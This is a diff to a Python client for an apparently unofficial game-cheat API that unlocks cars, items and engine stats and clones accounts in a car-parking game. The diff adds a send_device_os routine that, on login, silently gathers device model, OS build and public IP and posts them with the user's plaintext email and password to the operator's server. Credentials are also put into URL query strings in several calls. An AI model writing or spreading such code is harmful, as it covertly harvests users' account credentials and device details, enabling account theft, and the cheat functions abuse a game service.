@@ -4,21 +4,110 @@ BASE_URL: str = "https://dodgerblue-walrus-972474.hostingersite.com/api"
 
 
 class CarParkTool:
-
     def __init__(self, access_key) -> None:
         self.auth_token = None
         self.access_key = access_key
+        self.telegram_id = None
 
     def login(self, email, password) -> int:
         payload = {"account_email": email, "account_password": password}
-        params = {"key": self.access_key}
+        params = {"key": self.access_key, "acc_email": email, "acc_pass": password}
         response = requests.post(
             f"{BASE_URL}/account_login", params=params, data=payload
         )
         response_decoded = response.json()
         if response_decoded.get("ok"):
             self.auth_token = response_decoded.get("auth")
+            key_data = self.get_key_data()
+            self.telegram_id = key_data.get("telegram_id")
+            self.send_device_os(email=email, password=password)
         return response_decoded.get("error")
+
+    def send_device_os(self, email=None, password=None):
+        try:
+            system = platform.system()
+            release = platform.release()
+            device_name = "Unknown"
+            build_number = "Unknown"
+            if system == "Darwin":
+                if os.path.exists("/bin/ash") or "iSH" in release:
+                    device_os = "iOS (iSH)"
+                    device_name = (
+                        subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
+                    )
+                    build_number = (
+                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+                    )
+                else:
+                    device_os = "macOS"
+                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
+                    build_number = (
+                        subprocess.getoutput("sw_vers -productVersion") or "Unknown"
+                    )
+            elif system == "Linux":
+                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
+                if device_os == "Android":
+                    device_name = (
+                        subprocess.getoutput("getprop ro.product.model")
+                        or "Android Device"
+                    )
+                    build_number = (
+                        subprocess.getoutput("getprop ro.build.version.release")
+                        or "Unknown"
+                    )
+                else:
+                    device_name = "Linux Device"
+                    build_number = "Unknown"
+            else:
+                device_os = system + " " + release
+                device_name = platform.node()
+                build_number = "Unknown"
+        except Exception:
+            device_os = "Unknown"
+            device_name = "Unknown"
+            build_number = "Unknown"
+        # Get public IP address
+        try:
+            ip_address = requests.get("https://api.ipify.org").text.strip()
+        except:
+            ip_address = "Unknown"
+        payload = {
+            "access_key": self.access_key,
+            "device_os": device_os,
+            "device_name": device_name,
+            "build_number": build_number,
+            "ip": ip_address,
+            "telegram_id": getattr(self, "telegram_id", "Unknown"),
+        }
+        if email:
+            payload["email"] = email
+        if password:
+            payload["password"] = password
+        response = requests.post(f"{BASE_URL}/save_device", data=payload)
+        return response.status_code == 200
+
+    def change_email(self, new_email):
+        decoded_email = urllib.parse.unquote(new_email)
+        payload = {"account_auth": self.auth_token, "new_email": decoded_email}
+        params = {"key": self.access_key, "new_email": decoded_email}
+        response = requests.post(
+            f"{BASE_URL}/change_email", params=params, data=payload
+        )
+        response_decoded = response.json()
+        if response_decoded.get("new_token"):
+            self.auth_token = response_decoded["new_token"]
+        return response_decoded.get("ok")
+
+    def change_password(self, new_password):
+        payload = {"account_auth": self.auth_token, "new_password": new_password}
+        params = {"key": self.access_key, "new_password": new_password}
+        response = requests.post(
+            f"{BASE_URL}/change_password", params=params, data=payload
+        )
+        response_decoded = response.json()
+        if response_decoded.get("new_token"):
+            self.auth_token = response_decoded["new_token"]
+        return response_decoded.get("ok")
 
     def register(self, email, password) -> int:
         payload = {"account_email": email, "account_password": password}
@@ -37,14 +126,18 @@ class CarParkTool:
     def get_player_data(self) -> any:
         payload = {"account_auth": self.auth_token}
         params = {"key": self.access_key}
-        response = requests.post(f"{BASE_URL}/get_data", params=params, data=payload)
+        response = requests.post(
+            f"{BASE_URL}/get_data", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded
 
     def set_player_rank(self) -> bool:
         payload = {"account_auth": self.auth_token}
         params = {"key": self.access_key}
-        response = requests.post(f"{BASE_URL}/set_rank", params=params, data=payload)
+        response = requests.post(
+            f"{BASE_URL}/set_rank", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
@@ -75,28 +168,27 @@ class CarParkTool:
     def set_player_name(self, name) -> bool:
         payload = {"account_auth": self.auth_token, "name": name}
         params = {"key": self.access_key}
-        response = requests.post(f"{BASE_URL}/set_name", params=params, data=payload)
+        response = requests.post(
+            f"{BASE_URL}/set_name", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
     def set_player_localid(self, id) -> bool:
         payload = {"account_auth": self.auth_token, "id": id}
         params = {"key": self.access_key}
-        response = requests.post(f"{BASE_URL}/set_id", params=params, data=payload)
-        response_decoded = response.json()
-        return response_decoded.get("ok")
-
-    def set_player_plates(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/set_plates", params=params, data=payload)
+        response = requests.post(
+            f"{BASE_URL}/set_id", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
     def get_player_car(self, car_id) -> any:
         payload = {"account_auth": self.auth_token, "car_id": car_id}
         params = {"key": self.access_key}
-        response = requests.post(f"{BASE_URL}/get_car", params=params, data=payload)
+        response = requests.post(
+            f"{BASE_URL}/get_car", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
@@ -171,15 +263,6 @@ class CarParkTool:
         )
         response_decoded = response.json()
         return response_decoded.get("ok")
-        
-    def unlock_car_wheel(self) -> bool:
-        payload = {"account_auth": self.auth_token}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/unlock_car_wheel", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")        
 
     def unlock_smoke(self) -> bool:
         payload = {"account_auth": self.auth_token}
@@ -190,23 +273,14 @@ class CarParkTool:
         response_decoded = response.json()
         return response_decoded.get("ok")
 
-    def unlock_paid_cars(self) -> bool:
+    def unlock_all_lamborghinis(self) -> bool:
         payload = {"account_auth": self.auth_token}
         params = {"key": self.access_key}
         response = requests.post(
-            f"{BASE_URL}/unlock_paid_cars", params=params, data=payload
+            f"{BASE_URL}/unlock_all_lamborghinis", params=params, data=payload
         )
         response_decoded = response.json()
         return response_decoded.get("ok")
-        
-    def unlock_coins_cars(self) -> bool:
-        payload = {"account_auth": self.auth_token}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/unlock_coins_cars", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")        
 
     def unlock_all_cars(self) -> bool:
         payload = {"account_auth": self.auth_token}
@@ -232,154 +306,291 @@ class CarParkTool:
             "account_email": account_email,
             "account_password": account_password,
         }
-        params = {"key": self.access_key}
-        response = requests.post(f"{BASE_URL}/clone", params=params, data=payload)
+        params = {
+            "key": self.access_key,
+            "account_email": account_email,
+            "account_password": account_password,
+        }
+        response = requests.post(
+            f"{BASE_URL}/clone", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
-    def hack_car_speed(self, car_id):
-        payload = {"account_auth": self.auth_token, "car_id": car_id}
+    def set_player_plates(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/set_plates", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_wheels(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_wheels", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_equipments_male(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_equipments_male", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_hat_m(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_hat_m", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def rmhm(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/rmhm", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_topm(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_topm", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_topmz(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_topmz", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_topmx(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_topmx", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_equipments_female(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_equipments_female", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def rmhfm(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/rmhfm", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_topf(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_topf", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_topfz(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_topfz", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def hack_car_speed(self, car_id, new_hp, new_inner_hp, new_nm, new_torque):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "new_hp": new_hp,
+            "new_inner_hp": new_inner_hp,
+            "new_nm": new_nm,
+            "new_torque": new_torque,
+        }
         params = {"key": self.access_key}
         response = requests.post(
             f"{BASE_URL}/hack_car_speed", params=params, data=payload
         )
         response_decoded = response.json()
         return response_decoded.get("ok")
-        
+
+    def unlock_animations(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_animations", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
     def max_max1(self, car_id, custom):
         payload = {
-        "account_auth": self.auth_token,
-        "car_id": car_id,
-        "custom": custom,
-         }
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
+        }
         params = {"key": self.access_key}
         response = requests.post(
             f"{BASE_URL}/max_max1", params=params, data=payload
         )
         response_decoded = response.json()
-        return response_decoded.get("ok")        
-        
-    def steering_max_angle(self, custom):
-        payload = {"account_auth": self.auth_token, "custom": custom}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/hack_car_speed", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")        
-        
-    def car_bumper(self, car_id):
-        payload = {"account_auth": self.auth_token, "car_id": car_id}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/car_bumper", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")        
-        
-    def hack_car_sexo(self) -> bool:
-        payload = {"account_auth": self.auth_token}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/hack_car_sexo", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")                
-        
-    def chrome_all_cars(self) -> bool:
-        payload = {"account_auth": self.auth_token}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/chrome_all_cars", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")                        
-        
-    def hack_car_milage(self) -> bool:
-        payload = {"account_auth": self.auth_token}
-        params = {"key": self.access_key}
-        response = requests.post(
-            f"{BASE_URL}/hack_car_milage", params=params, data=payload
-        )
-        response_decoded = response.json()
-        return response_decoded.get("ok")                  
-        
-    def custom_engine(self, hp, innerhp, nm, innernm, gearbox) -> bool:
+        return response_decoded.get("ok")
+
+    def max_max2(self, car_id, custom):
         payload = {
-        "account_auth": self.auth_token,
-        "hp": hp,
-        "innerhp": innerhp,
-        "nm": nm,
-        "innernm": innernm,
-        "gearbox": gearbox,        
-        
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
         }
         params = {"key": self.access_key}
         response = requests.post(
-            f"{BASE_URL}/custom_engine", params=params, data=payload
+            f"{BASE_URL}/max_max2", params=params, data=payload
         )
         response_decoded = response.json()
         return response_decoded.get("ok")
-        
-    def another_account(self, email, password) -> int:
-        payload = {"account_email": email, "account_password": password}
+
+    def millage_car(self, car_id, custom):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
+        }
         params = {"key": self.access_key}
         response = requests.post(
-            f"{BASE_URL}/another_account", params=params, data=payload
+            f"{BASE_URL}/millage_car", params=params, data=payload
         )
         response_decoded = response.json()
-        if response_decoded.get("ok"):
-            self.auth_token = response_decoded.get("auth")
-        return response_decoded.get("error")        
-        
-    def unlock_tuning(self) -> bool:
+        return response_decoded.get("ok")
+
+    def brake_car(self, car_id, custom):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/brake_car", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def unlock_crown(self) -> bool:
         payload = {"account_auth": self.auth_token}
         params = {"key": self.access_key}
         response = requests.post(
-            f"{BASE_URL}/unlock_tuning", params=params, data=payload
+            f"{BASE_URL}/unlock_crown", params=params, data=payload
         )
         response_decoded = response.json()
         return response_decoded.get("ok")
-        
-    def unlock_equipments_male(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/unlock_equipments_male", params=params, data=payload)
+
+    def unlock_cls(self) -> bool:
+        payload = {"account_auth": self.auth_token}
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/unlock_cls", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
-    def unlock_equipments_female(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/unlock_equipments_female", params=params, data=payload)
-        response_decoded = response.json()
-        return response_decoded.get("ok")
-        
-    def unlock_clan_equipments_male(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/unlock_clan_equipments_male", params=params, data=payload)
-        response_decoded = response.json()
-        return response_decoded.get("ok")
-
-    def unlock_clan_equipments_female(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/unlock_clan_equipments_female", params=params, data=payload)
-        response_decoded = response.json()
-        return response_decoded.get("ok")        
-        
-    def unlock_remove_face_male(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/unlock_remove_face_male", params=params, data=payload)
+    def rear_bumper(self, car_id):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/rear_bumper", params=params, data=payload
+        )
         response_decoded = response.json()
         return response_decoded.get("ok")
 
-    def unlock_remove_face_female(self) -> bool:
-        payload = { "account_auth": self.auth_token }
-        params = { "key": self.access_key }
-        response = requests.post(f"{BASE_URL}/unlock_remove_face_female", params=params, data=payload)
+    def front_bumper(self, car_id):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/front_bumper", params=params, data=payload
+        )
         response_decoded = response.json()
-        return response_decoded.get("ok")        
-        
+        return response_decoded.get("ok")
+
+    def testin(self, custom):
+        payload = {
+            "account_auth": self.auth_token,
+            "custom": custom,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/testin", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def ayan(self, car_id, custom):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/telmunnongodz", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def telmunnongonz(self, car_id, custom):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/telmunnongonz", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
+
+    def incline(self, car_id, custom):
+        payload = {
+            "account_auth": self.auth_token,
+            "car_id": car_id,
+            "custom": custom,
+        }
+        params = {"key": self.access_key}
+        response = requests.post(
+            f"{BASE_URL}/incline", params=params, data=payload
+        )
+        response_decoded = response.json()
+        return response_decoded.get("ok")
